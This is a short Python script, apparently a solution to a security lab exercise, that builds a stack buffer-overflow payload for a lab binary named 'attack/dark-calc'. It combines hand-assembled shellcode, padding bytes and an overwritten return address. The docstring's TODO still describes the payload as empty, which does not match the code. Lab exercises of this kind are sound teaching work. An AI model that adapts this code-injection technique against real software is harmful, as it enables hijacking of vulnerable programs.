#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

shellcode = (
    b"\xbf\x04\x00\x00\x00"       # mov edi, 4
    b"\xb8\x87\x1a\x40\x00"       # mov eax, 0x401a87
    b"\x68\x1f\x1c\x40\x00"       # push 0x401c1f
    b"\xff\xe0"                   # jmp rax
)

payload = (
    shellcode
    + b"A" * (24 - len(shellcode))
    + struct.pack("<Q", 0x721000800fd0)
)

sys.stdout.buffer.write(payload)
